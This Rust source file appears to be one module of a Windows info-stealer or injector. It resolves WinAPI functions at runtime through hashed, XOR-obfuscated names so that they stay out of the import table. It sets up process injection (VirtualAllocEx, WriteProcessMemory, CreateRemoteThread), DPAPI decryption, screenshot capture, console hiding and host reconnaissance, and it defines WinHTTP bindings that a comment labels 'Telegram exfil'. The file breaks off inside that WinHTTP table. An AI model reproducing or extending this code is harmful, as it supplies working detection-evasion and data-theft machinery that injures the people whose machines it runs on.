//! Runtime-resolved WinAPI table (Wave 2: IAT reduction).
//!
//! Every function the injector touches is resolved at runtime from the
//! loader's module list + each module's export directory via [`crate::resolve`]
//! — so none of these names appear in our own import table. The table is
//! resolved once per process and reused.
//!
//! The fn-pointer signatures are the raw export ABIs (callers check `BOOL`,
//! like the `windows` 0.62 wrapper bodies do with `.ok()`). The struct/string
//! types (`HANDLE`, `PCWSTR`, `STARTUPINFOW`, …) are `windows` crate type
//! aliases — compile-time only, adding no import-table entries.
//!
//! ABI notes (kept here because they sit under `fn(...) -> BOOL`):
//! - `CreateProcessW`/`CreateRemoteThread` take `*const c_void` for their
//!   SECURITY_ATTRIBUTES slots: a plain pointer at this ABI level, and we pass
//!   `None` anyway.
//! - `lpcommandline` is `PWSTR` (mutable) as `link!` declares it; we keep the
//!   `Option<PWSTR>` to mirror the crate wrapper we replaced.

use std::ffi::c_void;
use std::sync::OnceLock;

use windows::Win32::Foundation::{HANDLE, HLOCAL, HWND, WAIT_EVENT, WIN32_ERROR};
use windows::Win32::Security::Cryptography::CRYPT_INTEGER_BLOB;
use windows::Win32::System::Diagnostics::ToolHelp::{
    CREATE_TOOLHELP_SNAPSHOT_FLAGS, PROCESSENTRY32W,
};
use windows::Win32::System::Memory::{PAGE_PROTECTION_FLAGS, VIRTUAL_ALLOCATION_TYPE};
use windows::Win32::System::Registry::{HKEY, REG_SAM_FLAGS, REG_VALUE_TYPE};
use windows::Win32::System::Threading::{
    PROCESS_ACCESS_RIGHTS, PROCESS_CREATION_FLAGS, PROCESS_INFORMATION, PROCESS_NAME_FORMAT,
    STARTUPINFOW,
};
use windows::Win32::UI::WindowsAndMessaging::SHOW_WINDOW_CMD;
use windows::core::{BOOL, PCWSTR, PWSTR};

use crate::resolve::{api, hash_bytes, hash_mod_bytes};

// Precomputed module-name hashes. Computed at compile time from byte literals
// so the DLL names never appear minted in a typed `const &str` — the runtime
// resolution only ever sees the folded `u32`.
const MOD_KERNEL32: u32 = hash_mod_bytes(b"kernel32.dll");
const MOD_NTDLL: u32 = hash_mod_bytes(b"ntdll.dll");
const MOD_ADVAPI32: u32 = hash_mod_bytes(b"advapi32.dll");
const MOD_CRYPT32: u32 = hash_mod_bytes(b"crypt32.dll");
const MOD_USER32: u32 = hash_mod_bytes(b"user32.dll");
const MOD_GDI32: u32 = hash_mod_bytes(b"gdi32.dll");
const MOD_WINHTTP: u32 = hash_mod_bytes(b"winhttp.dll");

type ThreadRoutine = unsafe extern "system" fn(*mut c_void) -> u32;

/// GDI handles are opaque pointers at the raw ABI level (all 64-bit); using
/// plain aliases keeps GDI types out of the `windows` feature set.
pub type HDC = *mut c_void;
/// see [`HDC`]
pub type HBITMAP = *mut c_void;
/// see [`HDC`]
pub type HGDIOBJ = *mut c_void;
/// WinHTTP session/connection/request handle.
pub type HINTERNET = *mut c_void;

/// `MEMORYSTATUSEX` — layout via `GlobalMemoryStatusEx` (fixed on amd64).
#[repr(C)]
pub struct MemoryStatusEx {
    pub dw_length: u32,           // must be size_of::<Self>()
    pub dw_memory_load: u32,      // utilization percent
    pub ull_total_phys: u64,      // installed RAM bytes
    pub ull_avail_phys: u64,      // free RAM bytes
    pub ull_total_page_file: u64, // committed limit
    pub ull_avail_page_file: u64,
    pub ull_total_virtual: u64,
    pub ull_avail_virtual: u64,
    pub ull_avail_extended_virtual: u64,
}

/// `RTL_OSVERSIONINFOW` (ntdll's modern replacement for GetVersionExW).
#[repr(C)]
pub struct RtlOsVersionInfoW {
    pub dw_os_version_info_size: u32, // must be size_of::<Self>()
    pub dw_major_version: u32,
    pub dw_minor_version: u32,
    pub dw_build_number: u32,
    pub dw_platform_id: u32,
    pub sz_csd_version: [u16; 128],
}

/// `DISPLAY_DEVICEW` (primary-name query via EnumDisplayDevicesW).
#[repr(C)]
pub struct DisplayDeviceW {
    pub cb: u32,
    pub device_name: [u16; 32],
    pub device_string: [u16; 128],
    pub state_flags: u32,
    pub device_id: [u16; 128],
    pub device_key: [u16; 128],
}

/// `BITMAPINFOHEADER` (40-byte GDI header for GetDIBits).
#[repr(C)]
pub struct BitmapInfoHeader {
    pub bi_size: u32,
    pub bi_width: i32,
    pub bi_height: i32,
    pub bi_planes: u16,
    pub bi_bit_count: u16,
    pub bi_compression: u32,
    pub bi_size_image: u32,
    pub bi_x_ppels_per_meter: i32,
    pub bi_y_ppels_per_meter: i32,
    pub bi_clr_used: u32,
    pub bi_clr_important: u32,
}

impl BitmapInfoHeader {
    /// To-down 24bpp RGB header (negative height = top-down row order).
    pub fn top_down_24bpp(width: u32, height: u32) -> Self {
        BitmapInfoHeader {
            bi_size: std::mem::size_of::<BitmapInfoHeader>() as u32,
            bi_width: width as i32,
            bi_height: -(height as i64) as i32,
            bi_planes: 1,
            bi_bit_count: 24,
            bi_compression: 0, // BI_RGB
            bi_size_image: 0,
            bi_x_ppels_per_meter: 0,
            bi_y_ppels_per_meter: 0,
            bi_clr_used: 0,
            bi_clr_important: 0,
        }
    }
}

/// Resolve one export in `module` (case-folded, like the module walk).
///
/// If the module isn't resident yet (e.g. crypt32), load it with
/// `kernel32!LoadLibraryW` — itself resolved from the always-resident
/// kernel32 — before walking the loader's module list again. `module_wide` is
/// the module name as a NUL-terminated UTF-16 buffer, *obfuscated at
/// const-eval* ([`crate::obfu::xwide!`]) so the DLL name never appears
/// plaintext in the image. `module_hash` is precomputed at compile time from a
/// byte literal ([`hash_mod_bytes`]) so the plaintext module name is never
/// minted into a typed const.
fn resolve_in(module_hash: u32, export: &str, module_wide: &[u16]) -> Result<usize, &'static str> {
    if crate::resolve::module_base(module_hash).is_none() {
        load_module(module_wide)?;
    }
    api(module_hash, hash_bytes(export.as_bytes())).ok_or("unresolved export")
}

/// Ensure `module` is mapped: `LoadLibraryW` if absent (kernel32 is always
/// resident, so its export is resolvable without any other module resident).
/// The name arrives pre-obfuscated as NUL-terminated UTF-16.
fn load_module(wide: &[u16]) -> Result<(), &'static str> {
    let loader_name = crate::xs!("LoadLibraryW", 0x31);
    let loader = api(
        hash_mod_bytes(b"kernel32.dll"),
        hash_bytes(loader_name.as_bytes()),
    )
    .ok_or("loader")?;
    // SAFETY: LoadLibraryW's address came from kernel32's export directory;
    // the signature is the raw ABI and `wide` is NUL-terminated UTF-16.
    unsafe {
        std::mem::transmute::<usize, unsafe extern "system" fn(PCWSTR) -> HANDLE>(loader)(PCWSTR(
            wide.as_ptr(),
        ));
    }
    Ok(())
}

/// Exact raw-ABI kernel32 export set used by the injector.
pub struct Kernel32 {
    /// `CloseHandle(hobject) -> BOOL`
    pub close_handle: unsafe extern "system" fn(HANDLE) -> BOOL,
    /// `GetLastError() -> WIN32_ERROR`
    pub get_last_error: unsafe extern "system" fn() -> WIN32_ERROR,
    /// `ReadProcessMemory(h, base, buf, len, &written) -> BOOL`
    pub read_process_memory:
        unsafe extern "system" fn(HANDLE, *const c_void, *mut c_void, usize, *mut usize) -> BOOL,
    /// `WriteProcessMemory(h, base, src, len, &written) -> BOOL`
    pub write_process_memory:
        unsafe extern "system" fn(HANDLE, *const c_void, *const c_void, usize, *mut usize) -> BOOL,
    /// `VirtualAllocEx(h, addr, size, type, prot) -> *mut c_void` (NULL on fail)
    pub virtual_alloc_ex: unsafe extern "system" fn(
        HANDLE,
        *const c_void,
        usize,
        VIRTUAL_ALLOCATION_TYPE,
        PAGE_PROTECTION_FLAGS,
    ) -> *mut c_void,
    /// `CreateProcessW(...) -> BOOL`
    #[allow(clippy::type_complexity)]
    pub create_process_w: unsafe extern "system" fn(
        PCWSTR,
        PWSTR,
        *const c_void,
        *const c_void,
        BOOL,
        PROCESS_CREATION_FLAGS,
        *const c_void,
        PCWSTR,
        *const STARTUPINFOW,
        *mut PROCESS_INFORMATION,
    ) -> BOOL,
    /// `CreateRemoteThread(h, attrs, stack, start, param, flags, &tid) -> HANDLE` (NULL on fail)
    pub create_remote_thread: unsafe extern "system" fn(
        HANDLE,
        *const c_void,
        usize,
        ThreadRoutine,
        *const c_void,
        u32,
        *mut u32,
    ) -> HANDLE,
    /// `ResumeThread(h) -> u32`
    pub resume_thread: unsafe extern "system" fn(HANDLE) -> u32,
    /// `TerminateProcess(h, code) -> BOOL`
    pub terminate_process: unsafe extern "system" fn(HANDLE, u32) -> BOOL,
    /// `WaitForSingleObject(h, ms) -> WAIT_EVENT`
    pub wait_for_single_object: unsafe extern "system" fn(HANDLE, u32) -> WAIT_EVENT,
    /// `GetExitCodeProcess(h, &code) -> BOOL`
    pub get_exit_code_process: unsafe extern "system" fn(HANDLE, *mut u32) -> BOOL,
    /// `ExpandEnvironmentStringsW(src, dst, cap) -> u32` (return = length / 0 on fail)
    pub expand_environment_strings_w: unsafe extern "system" fn(PCWSTR, PWSTR, u32) -> u32,
    /// `OpenProcess(access, inherit, pid) -> HANDLE` (NULL on fail)
    pub open_process: unsafe extern "system" fn(PROCESS_ACCESS_RIGHTS, BOOL, u32) -> HANDLE,
    /// `QueryFullProcessImageNameW(h, fmt, buf, &len) -> BOOL`
    pub query_full_process_image_name_w:
        unsafe extern "system" fn(HANDLE, PROCESS_NAME_FORMAT, PWSTR, *mut u32) -> BOOL,
    /// `K32EnumProcesses(pids, bytes, &returned) -> BOOL`
    pub k32_enum_processes: unsafe extern "system" fn(*mut u32, u32, *mut u32) -> BOOL,
    /// `LocalFree(h) -> HLOCAL` (NULL on success)
    pub local_free: unsafe extern "system" fn(HLOCAL) -> HLOCAL,
    /// `GetConsoleWindow() -> HWND` (0 if none attached)
    pub get_console_window: unsafe extern "system" fn() -> HWND,
    /// `CreateToolhelp32Snapshot(flags, pid) -> HANDLE` (INVALID_HANDLE_VALUE on fail)
    pub create_toolhelp32_snapshot:
        unsafe extern "system" fn(CREATE_TOOLHELP_SNAPSHOT_FLAGS, u32) -> HANDLE,
    /// `Process32FirstW(snap, entry) -> BOOL`
    pub process32_first_w: unsafe extern "system" fn(HANDLE, *mut PROCESSENTRY32W) -> BOOL,
    /// `Process32NextW(snap, entry) -> BOOL`
    pub process32_next_w: unsafe extern "system" fn(HANDLE, *mut PROCESSENTRY32W) -> BOOL,
    /// `GetComputerNameExW(format, buf, &len) -> BOOL` (returns count on success)
    pub get_computer_name_ex_w: unsafe extern "system" fn(u32, PWSTR, *mut u32) -> BOOL,
    /// `GlobalMemoryStatusEx(&status) -> BOOL`
    pub global_memory_status_ex: unsafe extern "system" fn(*mut MemoryStatusEx) -> BOOL,
    /// `GetVolumeInformationW(root, vol, volcap, &serial, &maxcomp, &flags, fs, fscap) -> BOOL`
    #[allow(clippy::too_many_arguments)]
    pub get_volume_information_w: unsafe extern "system" fn(
        PCWSTR,
        PWSTR,
        u32,
        *mut u32,
        *mut u32,
        *mut u32,
        PWSTR,
        u32,
    ) -> BOOL,
    /// `GetDiskFreeSpaceExW(dir, &free_to_caller, &total, &total_free) -> BOOL`
    pub get_disk_free_space_ex_w:
        unsafe extern "system" fn(PCWSTR, *mut u64, *mut u64, *mut u64) -> BOOL,
    /// `GetLogicalDrives() -> DWORD` (bit 0 = A:, 1 = B:, ... 25 = Z:)
    pub get_logical_drives: unsafe extern "system" fn() -> u32,
    /// `GetDriveTypeW(root) -> u32` (DRIVE_FIXED == 3)
    pub get_drive_type_w: unsafe extern "system" fn(PCWSTR) -> u32,
    /// `SetFileAttributesW(path, attrs) -> BOOL`
    pub set_file_attributes_w: unsafe extern "system" fn(PCWSTR, u32) -> BOOL,
}

/// Resolved-at-first-use kernel32 table.
pub static KERNEL32: OnceLock<Kernel32> = OnceLock::new();

fn load() -> Result<Kernel32, &'static str> {
    let module_wide = crate::xwide!("kernel32.dll", 0x5E);
    macro_rules! resolve {
        ($e:literal) => {{
            let name = crate::xs!($e, 0x97);
            match resolve_in(MOD_KERNEL32, name.as_str(), &module_wide) {
                Ok(a) => a,
                Err(name) => return Err(name),
            }
        }};
    }

    // SAFETY: each `resolve!` is the verified code address of a kernel32 export
    // (kernel32 is loaded in every Windows process; the module hash is fixed
    // and case-folded, the export name hash is exact). transmute is the
    // sanctioned usize→fn-ptr bridge on x86-64; the signatures match the raw
    // `windows` 0.62 `link!` ABIs for the same exports.
    unsafe {
        Ok(Kernel32 {
            close_handle: std::mem::transmute::<usize, unsafe extern "system" fn(HANDLE) -> BOOL>(
                resolve!("CloseHandle"),
            ),
            get_last_error: std::mem::transmute::<usize, unsafe extern "system" fn() -> WIN32_ERROR>(
                resolve!("GetLastError"),
            ),
            read_process_memory: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    HANDLE,
                    *const c_void,
                    *mut c_void,
                    usize,
                    *mut usize,
                ) -> BOOL,
            >(resolve!("ReadProcessMemory")),
            write_process_memory: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    HANDLE,
                    *const c_void,
                    *const c_void,
                    usize,
                    *mut usize,
                ) -> BOOL,
            >(resolve!("WriteProcessMemory")),
            virtual_alloc_ex: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    HANDLE,
                    *const c_void,
                    usize,
                    VIRTUAL_ALLOCATION_TYPE,
                    PAGE_PROTECTION_FLAGS,
                ) -> *mut c_void,
            >(resolve!("VirtualAllocEx")),
            create_process_w: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    PCWSTR,
                    PWSTR,
                    *const c_void,
                    *const c_void,
                    BOOL,
                    PROCESS_CREATION_FLAGS,
                    *const c_void,
                    PCWSTR,
                    *const STARTUPINFOW,
                    *mut PROCESS_INFORMATION,
                ) -> BOOL,
            >(resolve!("CreateProcessW")),
            create_remote_thread: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    HANDLE,
                    *const c_void,
                    usize,
                    ThreadRoutine,
                    *const c_void,
                    u32,
                    *mut u32,
                ) -> HANDLE,
            >(resolve!("CreateRemoteThread")),
            resume_thread: std::mem::transmute::<usize, unsafe extern "system" fn(HANDLE) -> u32>(
                resolve!("ResumeThread"),
            ),
            terminate_process: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HANDLE, u32) -> BOOL,
            >(resolve!("TerminateProcess")),
            wait_for_single_object: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HANDLE, u32) -> WAIT_EVENT,
            >(resolve!("WaitForSingleObject")),
            get_exit_code_process: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HANDLE, *mut u32) -> BOOL,
            >(resolve!("GetExitCodeProcess")),
            expand_environment_strings_w: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(PCWSTR, PWSTR, u32) -> u32,
            >(resolve!("ExpandEnvironmentStringsW")),
            open_process: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(PROCESS_ACCESS_RIGHTS, BOOL, u32) -> HANDLE,
            >(resolve!("OpenProcess")),
            query_full_process_image_name_w: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HANDLE, PROCESS_NAME_FORMAT, PWSTR, *mut u32) -> BOOL,
            >(resolve!("QueryFullProcessImageNameW")),
            k32_enum_processes: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(*mut u32, u32, *mut u32) -> BOOL,
            >(resolve!("K32EnumProcesses")),
            local_free: std::mem::transmute::<usize, unsafe extern "system" fn(HLOCAL) -> HLOCAL>(
                resolve!("LocalFree"),
            ),
            get_console_window: std::mem::transmute::<usize, unsafe extern "system" fn() -> HWND>(
                resolve!("GetConsoleWindow"),
            ),
            create_toolhelp32_snapshot: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(CREATE_TOOLHELP_SNAPSHOT_FLAGS, u32) -> HANDLE,
            >(resolve!("CreateToolhelp32Snapshot")),
            process32_first_w: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HANDLE, *mut PROCESSENTRY32W) -> BOOL,
            >(resolve!("Process32FirstW")),
            process32_next_w: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HANDLE, *mut PROCESSENTRY32W) -> BOOL,
            >(resolve!("Process32NextW")),
            get_computer_name_ex_w: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(u32, PWSTR, *mut u32) -> BOOL,
            >(resolve!("GetComputerNameExW")),
            global_memory_status_ex: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(*mut MemoryStatusEx) -> BOOL,
            >(resolve!("GlobalMemoryStatusEx")),
            get_volume_information_w: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    PCWSTR,
                    PWSTR,
                    u32,
                    *mut u32,
                    *mut u32,
                    *mut u32,
                    PWSTR,
                    u32,
                ) -> BOOL,
            >(resolve!("GetVolumeInformationW")),
            get_disk_free_space_ex_w: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(PCWSTR, *mut u64, *mut u64, *mut u64) -> BOOL,
            >(resolve!("GetDiskFreeSpaceExW")),
            get_logical_drives: std::mem::transmute::<usize, unsafe extern "system" fn() -> u32>(
                resolve!("GetLogicalDrives"),
            ),
            get_drive_type_w: std::mem::transmute::<usize, unsafe extern "system" fn(PCWSTR) -> u32>(
                resolve!("GetDriveTypeW"),
            ),
            set_file_attributes_w: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(PCWSTR, u32) -> BOOL,
            >(resolve!("SetFileAttributesW")),
        })
    }
}

/// Resolve the table once (idempotent across threads).
///
/// Safer than returning the raw `Result`: either we've already resolved the
/// whole table or the first caller caches the resolution error forever. The
/// first failure aborts the injector anyway, so a panic with a precise message
/// is the honest surface.
pub fn kernel32() -> &'static Kernel32 {
    KERNEL32.get_or_init(|| match load() {
        Ok(t) => t,
        Err(name) => panic!("apitable: failed to resolve kernel32!{name}"),
    })
}

/// advapi32 API table (Wave 4: discovery registry reads).
pub struct Advapi32 {
    /// `RegOpenKeyExW(root, sub, opts, access, &out) -> WIN32_ERROR`
    pub reg_open_key_ex_w:
        unsafe extern "system" fn(HKEY, PCWSTR, u32, REG_SAM_FLAGS, *mut HKEY) -> WIN32_ERROR,
    /// `RegQueryValueExW(key, name, reserved, &type, data, &cb) -> WIN32_ERROR`
    pub reg_query_value_ex_w: unsafe extern "system" fn(
        HKEY,
        PCWSTR,
        *const u32,
        *mut REG_VALUE_TYPE,
        *mut u8,
        *mut u32,
    ) -> WIN32_ERROR,
    /// `RegCloseKey(key) -> WIN32_ERROR`
    pub reg_close_key: unsafe extern "system" fn(HKEY) -> WIN32_ERROR,
    /// `GetUserNameW(buf, &len) -> BOOL`
    pub get_user_name_w: unsafe extern "system" fn(PWSTR, *mut u32) -> BOOL,
}

/// Resolved-at-first-use advapi32 table.
pub static ADVAPI32: OnceLock<Advapi32> = OnceLock::new();

fn load_advapi32() -> Result<Advapi32, &'static str> {
    let module_wide = crate::xwide!("advapi32.dll", 0xB7);
    macro_rules! resolve {
        ($e:literal) => {{
            let name = crate::xs!($e, 0x97);
            match resolve_in(MOD_ADVAPI32, name.as_str(), &module_wide) {
                Ok(a) => a,
                Err(name) => return Err(name),
            }
        }};
    }
    // SAFETY: as in [`load`] — verified advapi32 export addresses transmuted to
    // fn pointers whose signatures match the raw `windows` 0.62 `link!` ABIs.
    unsafe {
        Ok(Advapi32 {
            reg_open_key_ex_w: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    HKEY,
                    PCWSTR,
                    u32,
                    REG_SAM_FLAGS,
                    *mut HKEY,
                ) -> WIN32_ERROR,
            >(resolve!("RegOpenKeyExW")),
            reg_query_value_ex_w: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    HKEY,
                    PCWSTR,
                    *const u32,
                    *mut REG_VALUE_TYPE,
                    *mut u8,
                    *mut u32,
                ) -> WIN32_ERROR,
            >(resolve!("RegQueryValueExW")),
            reg_close_key: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HKEY) -> WIN32_ERROR,
            >(resolve!("RegCloseKey")),
            get_user_name_w: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(PWSTR, *mut u32) -> BOOL,
            >(resolve!("GetUserNameW")),
        })
    }
}

pub fn advapi32() -> &'static Advapi32 {
    ADVAPI32.get_or_init(|| match load_advapi32() {
        Ok(t) => t,
        Err(name) => panic!("apitable: failed to resolve advapi32!{name}"),
    })
}

/// crypt32 API table (Wave 4: DPAPI).
pub struct Crypt32 {
    /// `CryptProtectData(&in, desc, entropy, reserved, prompt, flags, &out) -> BOOL`
    pub crypt_protect_data: unsafe extern "system" fn(
        *const CRYPT_INTEGER_BLOB,
        PCWSTR,
        *const CRYPT_INTEGER_BLOB,
        *const c_void,
        *const c_void,
        u32,
        *mut CRYPT_INTEGER_BLOB,
    ) -> BOOL,
    /// `CryptUnprotectData(&in, &desc, entropy, reserved, prompt, flags, &out) -> BOOL`
    pub crypt_unprotect_data: unsafe extern "system" fn(
        *const CRYPT_INTEGER_BLOB,
        *mut PWSTR,
        *const CRYPT_INTEGER_BLOB,
        *const c_void,
        *const c_void,
        u32,
        *mut CRYPT_INTEGER_BLOB,
    ) -> BOOL,
}

/// Resolved-at-first-use crypt32 table.
pub static CRYPT32: OnceLock<Crypt32> = OnceLock::new();

fn load_crypt32() -> Result<Crypt32, &'static str> {
    let module_wide = crate::xwide!("crypt32.dll", 0xC4);
    macro_rules! resolve {
        ($e:literal) => {{
            let name = crate::xs!($e, 0x97);
            match resolve_in(MOD_CRYPT32, name.as_str(), &module_wide) {
                Ok(a) => a,
                Err(name) => return Err(name),
            }
        }};
    }
    // SAFETY: as in [`load`] — verified crypt32 export addresses transmuted to
    // fn pointers whose signatures match the raw `windows` 0.62 `link!` ABIs.
    unsafe {
        Ok(Crypt32 {
            crypt_protect_data: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    *const CRYPT_INTEGER_BLOB,
                    PCWSTR,
                    *const CRYPT_INTEGER_BLOB,
                    *const c_void,
                    *const c_void,
                    u32,
                    *mut CRYPT_INTEGER_BLOB,
                ) -> BOOL,
            >(resolve!("CryptProtectData")),
            crypt_unprotect_data: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    *const CRYPT_INTEGER_BLOB,
                    *mut PWSTR,
                    *const CRYPT_INTEGER_BLOB,
                    *const c_void,
                    *const c_void,
                    u32,
                    *mut CRYPT_INTEGER_BLOB,
                ) -> BOOL,
            >(resolve!("CryptUnprotectData")),
        })
    }
}

pub fn crypt32() -> &'static Crypt32 {
    CRYPT32.get_or_init(|| match load_crypt32() {
        Ok(t) => t,
        Err(name) => panic!("apitable: failed to resolve crypt32!{name}"),
    })
}

/// user32 API table (Wave 5: console visibility; this wave: sysinfo/screenshot).
pub struct User32 {
    /// `ShowWindow(hwnd, cmd) -> BOOL` (return = previous visibility)
    pub show_window: unsafe extern "system" fn(HWND, SHOW_WINDOW_CMD) -> BOOL,
    /// `GetSystemMetrics(index) -> i32`
    pub get_system_metrics: unsafe extern "system" fn(i32) -> i32,
    /// `GetDC(hwnd) -> HDC` (NULL on failure; NULL hwnd = whole screen)
    pub get_dc: unsafe extern "system" fn(HWND) -> HDC,
    /// `ReleaseDC(hwnd, dc) -> i32`
    pub release_dc: unsafe extern "system" fn(HWND, HDC) -> i32,
    /// `EnumDisplayDevicesW(device, index, &info, flags) -> BOOL`
    pub enum_display_devices_w:
        unsafe extern "system" fn(PCWSTR, u32, *mut DisplayDeviceW, u32) -> BOOL,
}

/// Resolved-at-first-use user32 table.
pub static USER32: OnceLock<User32> = OnceLock::new();

fn load_user32() -> Result<User32, &'static str> {
    let module_wide = crate::xwide!("user32.dll", 0x8A);
    macro_rules! resolve {
        ($e:literal) => {{
            let name = crate::xs!($e, 0x97);
            match resolve_in(MOD_USER32, name.as_str(), &module_wide) {
                Ok(a) => a,
                Err(name) => return Err(name),
            }
        }};
    }
    // SAFETY: as in [`load`] — verified user32 export addresses, outlined ABIs.
    unsafe {
        Ok(User32 {
            show_window: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HWND, SHOW_WINDOW_CMD) -> BOOL,
            >(resolve!("ShowWindow")),
            get_system_metrics: std::mem::transmute::<usize, unsafe extern "system" fn(i32) -> i32>(
                resolve!("GetSystemMetrics"),
            ),
            get_dc: std::mem::transmute::<usize, unsafe extern "system" fn(HWND) -> HDC>(resolve!(
                "GetDC"
            )),
            release_dc: std::mem::transmute::<usize, unsafe extern "system" fn(HWND, HDC) -> i32>(
                resolve!("ReleaseDC"),
            ),
            enum_display_devices_w: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(PCWSTR, u32, *mut DisplayDeviceW, u32) -> BOOL,
            >(resolve!("EnumDisplayDevicesW")),
        })
    }
}

pub fn user32() -> &'static User32 {
    USER32.get_or_init(|| match load_user32() {
        Ok(t) => t,
        Err(name) => panic!("apitable: failed to resolve user32!{name}"),
    })
}

/// gdi32 API table (screenshot capture — runtime-resolved like the rest).
pub struct Gdi32 {
    /// `CreateCompatibleDC(dc) -> HDC` (NULL on failure)
    pub create_compatible_dc: unsafe extern "system" fn(HDC) -> HDC,
    /// `CreateCompatibleBitmap(dc, w, h) -> HBITMAP` (NULL on failure)
    pub create_compatible_bitmap: unsafe extern "system" fn(HDC, i32, i32) -> HBITMAP,
    /// `SelectObject(dc, obj) -> HGDIOBJ` (previous object; NULL/error if HGDI_ERROR)
    pub select_object: unsafe extern "system" fn(HDC, HGDIOBJ) -> HGDIOBJ,
    /// `DeleteObject(obj) -> BOOL`
    pub delete_object: unsafe extern "system" fn(HGDIOBJ) -> BOOL,
    /// `BitBlt(dest, x, y, w, h, src, sx, sy, rop) -> BOOL`
    pub bit_blt: unsafe extern "system" fn(HDC, i32, i32, i32, i32, HDC, i32, i32, u32) -> BOOL,
    /// `GetDIBits(dc, bmp, first, count, bits, &info, usage) -> i32` (lines copied)
    pub get_dib_bits:
        unsafe extern "system" fn(HDC, HBITMAP, u32, u32, *mut c_void, *mut c_void, u32) -> i32,
}

/// Resolved-at-first-use gdi32 table.
pub static GDI32: OnceLock<Gdi32> = OnceLock::new();

fn load_gdi32() -> Result<Gdi32, &'static str> {
    let module_wide = crate::xwide!("gdi32.dll", 0x3B);
    macro_rules! resolve {
        ($e:literal) => {{
            let name = crate::xs!($e, 0x97);
            match resolve_in(MOD_GDI32, name.as_str(), &module_wide) {
                Ok(a) => a,
                Err(name) => return Err(name),
            }
        }};
    }
    // SAFETY: as in [`load`] — verified gdi32 export addresses, outlined ABIs.
    unsafe {
        Ok(Gdi32 {
            create_compatible_dc: std::mem::transmute::<usize, unsafe extern "system" fn(HDC) -> HDC>(
                resolve!("CreateCompatibleDC"),
            ),
            create_compatible_bitmap: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HDC, i32, i32) -> HBITMAP,
            >(resolve!("CreateCompatibleBitmap")),
            select_object: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HDC, HGDIOBJ) -> HGDIOBJ,
            >(resolve!("SelectObject")),
            delete_object: std::mem::transmute::<usize, unsafe extern "system" fn(HGDIOBJ) -> BOOL>(
                resolve!("DeleteObject"),
            ),
            bit_blt: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(HDC, i32, i32, i32, i32, HDC, i32, i32, u32) -> BOOL,
            >(resolve!("BitBlt")),
            get_dib_bits: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(
                    HDC,
                    HBITMAP,
                    u32,
                    u32,
                    *mut c_void,
                    *mut c_void,
                    u32,
                ) -> i32,
            >(resolve!("GetDIBits")),
        })
    }
}

pub fn gdi32() -> &'static Gdi32 {
    GDI32.get_or_init(|| match load_gdi32() {
        Ok(t) => t,
        Err(name) => panic!("apitable: failed to resolve gdi32!{name}"),
    })
}

/// ntdll API table (OS version string for sysinfo).
pub struct Ntdll {
    /// `RtlGetVersion(&info) -> i32` (0 = STATUS_SUCCESS)
    pub rtl_get_version: unsafe extern "system" fn(*mut RtlOsVersionInfoW) -> i32,
}

/// Resolved-at-first-use ntdll table.
pub static NTDLL: OnceLock<Ntdll> = OnceLock::new();

fn load_ntdll() -> Result<Ntdll, &'static str> {
    let module_wide = crate::xwide!("ntdll.dll", 0x19);
    macro_rules! resolve {
        ($e:literal) => {{
            let name = crate::xs!($e, 0x97);
            match resolve_in(MOD_NTDLL, name.as_str(), &module_wide) {
                Ok(a) => a,
                Err(name) => return Err(name),
            }
        }};
    }
    // SAFETY: as in [`load`] — verified ntdll export address, outlined ABI.
    unsafe {
        Ok(Ntdll {
            rtl_get_version: std::mem::transmute::<
                usize,
                unsafe extern "system" fn(*mut RtlOsVersionInfoW) -> i32,
            >(resolve!("RtlGetVersion")),
        })
    }
}

pub fn ntdll() -> &'static Ntdll {
    NTDLL.get_or_init(|| match load_ntdll() {
        Ok(t) => t,
        Err(name) => panic!("apitable: failed to resolve ntdll!{name}"),
    })
}

/// winhttp API table (Telegram exfil, wave 7 — runtime-resolved so winhttp.dll
/// never appears in the import table).
pub struct WinHttp {
    /// `WinHttpOpen(agent, access, proxy, bypass, flags) -> HINTERNET` (NULL on fail)
    pub open: unsafe extern "system" fn(PCWSTR, u32, PCWSTR, PCWSTR, u32) -> HINTERNET,
    /// `WinHttpConnect(session, server, port, reserved) -> HINTERNET`
    pub connect: unsafe extern "system" fn(HINTERNET, PCWSTR, u16, u32) -> HINTERNET,
    /// `WinHttpOpenRequest(conn, verb, object, ver, referrer, accept, flags) -> HINTERNET`
    pub open_request: unsafe extern "system" fn(
        HINTERNET,
        PCWSTR,
        PCWSTR,
        PCWSTR,
        PCWSTR,
        *const *const u16,
        u32,
    ) -> HINTERNET,
    /// `WinHttpSendRequest(req, headers, hlen, body, blen, total, ctx) -> BOOL`
    pub send_request:
        unsafe extern "system" fn(HINTERNET, PCWSTR, u32, *mut c_void, u32, u32, usize) -> BOOL,
    /// `WinHttpWriteData(req, data, len, &written) -> BOOL`
    pub write_data: unsafe extern "system" fn(HINTERNET, *const c_void, u32, *mut u32) -> BOOL,
